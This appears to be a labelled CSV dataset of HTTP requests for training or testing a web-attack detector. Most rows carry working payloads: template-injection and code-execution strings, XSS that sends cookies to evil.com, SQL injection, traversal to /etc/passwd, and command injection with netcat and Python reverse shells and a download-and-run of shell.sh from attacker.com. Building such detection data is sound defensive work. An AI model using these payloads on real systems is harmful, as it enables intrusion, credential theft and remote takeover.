request_normalized,label
"GET /api/process?data=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=;assert(system('id'));&submit=1",rce
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"GET /products?filter=1'; DROP TABLE users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"GET /api/process?data={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=info@site.net&message=Hello World",benign
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /download?file=/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

input=<IMG SRC=JaVaScRiPt:alert('XSS')>&submit=1",xss
"GET /profile?bio=javascript:alert('XSS') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=1 UNION SELECT user(),database(),version()--&submit=1",sqli
"GET /tools/lookup?domain=; cat /etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /tools/lookup?domain=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=<script>alert('xss')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /profile?bio=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=<svg onload=alert(1)>&submit=1",xss
"GET /admin/run?input=$(cat /etc/passwd) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/products?category=laptop&page=9&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /feedback?msg=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

input=<img src='x' onerror='this.src=""http://evil.com/?c="" document.cookie'>&submit=1",xss
"GET /api/ping?host=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=' OR ''='&submit=1",sqli
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=; ls -la&submit=1",cmdi
"GET /api/v2/orders?status=pending&user_id=906 HTTP/1.1
Host: api.example.com
Authorization: Bearer a2533514f351980f7afee45fafa0b970",benign
"GET /search?q=xss""><img src=/ onerror=alert(2)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=1'; DROP TABLE users--&submit=1",sqli
"GET /calc?formula=java.lang.Runtime.exec('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

input=1' UNION SELECT null,username,password FROM users--&submit=1",sqli
"GET /products?filter=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=../../boot.ini&submit=1",path_traversal
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"GET /api/v2/orders?status=pending&user_id=2085 HTTP/1.1
Host: api.example.com
Authorization: Bearer c936d486930743569704193e419079ee",benign
"GET /api/products?category=phone&page=2&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /feedback?msg=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=����/����/etc/passwd&submit=1",path_traversal
"GET /api/products?category=phone&page=27&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /eval?code=eval(base64_decode('c3lzdGVtKCdpZCcp')); HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q=1 OR 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"GET /news/article/breaking-news HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=john_doe&email=info@site.net&message=Hello World",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=1; SELECT * FROM users WHERE '1'='1&submit=1",sqli
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=javascript:alert('XSS')&submit=1",xss
"GET /eval?code=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=| nc attacker.com 4444 -e /bin/bash&submit=1",cmdi
"GET /products?filter=' OR 1=1 LIMIT 1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=| nc attacker.com 4444 -e /bin/bash&submit=1",cmdi
"GET /search?q=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=../../../../etc/passwd&submit=1",path_traversal
"GET /tools/lookup?domain=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /calc?formula={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input=${T(java.lang.Runtime).getRuntime().exec('id')}&submit=1",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 UNION SELECT null,password FROM users--&submit=1",sqli
"GET /user?id=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /profile?bio=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /profile?bio=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /feedback?msg=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/ping?host=| net user HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

input=eval(compile('import os; os.system(""id"")', 'string', 'exec'))&submit=1",rce
"GET /api/products?category=camera&page=26&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /user?id='; EXEC xp_cmdshell('dir')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg=<img src='x' onerror='this.src=""http://evil.com/?c="" document.cookie'> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""john_doe"",""password"":""52154704""}",benign
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=<script>alert('XSS')</script>&submit=1",xss
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"GET /assets?path=../etc/passwd.jpg HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /profile?bio=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/products?category=camera&page=9&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"GET /products?filter=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /admin/run?input=| net user HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /calc?formula=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/ping?host=; ls -la HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=`php -r 'system(""id"");'`&submit=1",rce
"GET /calc?formula=eval(base64_decode('c3lzdGVtKCdpZCcp')); HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

input={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&submit=1",rce
"GET /products?filter=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/process?data=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=&& cat /etc/passwd&submit=1",cmdi
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=' UNION SELECT *, NULL FROM users--&submit=1",sqli
"GET /assets?path=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=����/����/etc/passwd&submit=1",path_traversal
"GET /images/img_8449.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=| whoami&submit=1",cmdi
"GET /template?expr=java.lang.Runtime.exec('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /assets?path=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=info@site.net&message=Hello World",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=<script>alert('XSS')</script>&submit=1",xss
"GET /images/img_9151.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /search?q=books&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=d4ab455e3f4c3e21",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=`php -r 'system(""id"");'`&submit=1",rce
"GET /products?filter=' OR 'x'='x HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/items?name=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg='-alert(1)-' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /images/img_2590.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=1'; DROP TABLE users--&submit=1",sqli
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=system('id')&submit=1",rce
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

input=....\....\....\windows\system32\drivers\etc\hosts&submit=1",path_traversal
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=' UNION ALL SELECT NULL,NULL,NULL--&submit=1",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=| id&submit=1",cmdi
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"GET /api/process?data={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /view?doc=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input=java.lang.Runtime.exec('id')&submit=1",rce
"GET /api/process?data=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /exec?cmd=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /admin/run?input=& ipconfig HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/v2/orders?status=pending&user_id=4366 HTTP/1.1
Host: api.example.com
Authorization: Bearer b72837c53bfaeec8294f6c5050042791",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=eval(base64_decode('c3lzdGVtKCdpZCcp'));&submit=1",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=' OR ''='&submit=1",sqli
"GET /search?q=' OR 1=1 LIMIT 1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"GET /products?filter=' UNION ALL SELECT NULL,NULL,NULL-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=eval(base64_decode('c3lzdGVtKCdpZCcp'));&submit=1",rce
"POST /api/users/7424/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""john_doe"",""email"":""user@example.com""}",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

input={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}&submit=1",rce
"GET /image?src=../etc/passwd.jpg HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /images/img_9676.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /api/ping?host=| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /api/ping?host=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

input=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script>&submit=1",xss
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=`id`&submit=1",cmdi
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=1 AND 1=1&submit=1",sqli
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=javascript:alert('XSS')&submit=1",xss
"GET /view?doc=../../boot.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

input=../etc/passwd&submit=1",path_traversal
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"GET /eval?code=system('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /profile?bio=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=${7*7}&submit=1",rce
"GET /search?q=clothing&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=86d95ac57ddd9860",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

input=../etc/passwd.jpg&submit=1",path_traversal
"GET /api/ping?host=; systeminfo HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 191

input=; python3 -c 'import socket;s=socket.socket();s.connect((""attacker.com"",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")'&submit=1",cmdi
"GET /feedback?msg=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/users/7134/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""john_doe"",""email"":""admin@test.org""}",benign
"GET /api/v2/orders?status=pending&user_id=4018 HTTP/1.1
Host: api.example.com
Authorization: Bearer ed549935d6783c3e021187d053366904",benign
"GET /tools/lookup?domain=; ls -la HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""6e9abfdd""}",benign
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=| id&submit=1",cmdi
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<?php passthru('cat /etc/passwd'); ?>&submit=1",rce
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /exec?cmd=| id HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=<script>alert('XSS')</script>&submit=1",xss
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=/etc/passwd&submit=1",path_traversal
"GET /api/v2/orders?status=pending&user_id=6612 HTTP/1.1
Host: api.example.com
Authorization: Bearer 97933811d5f4dc756e0a3d4a5135d2cb",benign
